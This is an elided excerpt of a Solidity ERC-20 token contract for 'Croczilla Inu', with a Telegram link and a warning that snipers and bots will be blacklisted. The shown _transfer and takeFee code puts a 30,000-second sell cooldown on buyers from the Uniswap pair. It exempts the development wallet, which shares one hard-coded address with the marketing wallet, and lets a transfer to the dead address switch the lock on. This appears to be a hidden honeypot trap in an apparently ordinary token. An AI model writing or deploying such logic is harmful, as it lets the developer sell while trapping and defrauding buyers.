...
/**
    Telegram : https://t.me/CroczillaInu
    
    RULE :
    - NO SNIPER
    - NO BOT
    
    WARNED YOU! SURELY BLACKLISTED
*/
...
contract CroczillaInu is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "Croczilla Inu";
    string private _symbol = "CZI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5c5922214B571FcF2FD3Ec665fc1e09C68c17Aac);
    address payable public DevelopmentWalletAddress = payable(0x5c5922214B571FcF2FD3Ec665fc1e09C68c17Aac);
    ...
    uint256 public _ReadyTime = 30000 seconds;
    mapping (address => uint256) public readyTimes;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {
            if(sender != DevelopmentWalletAddress && recipient != DevelopmentWalletAddress){
                if (sender == uniswapPair && !isExcludedFromFee[recipient] ) { readyTimes[recipient] = block.timestamp + _ReadyTime; }
                if (sender != uniswapPair && setReadyTimes) { require(block.timestamp >= readyTimes[sender], "Cooldown"); }
            }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(deadAddress == recipient && DevelopmentWalletAddress != sender){ setReadyTimes = true; }
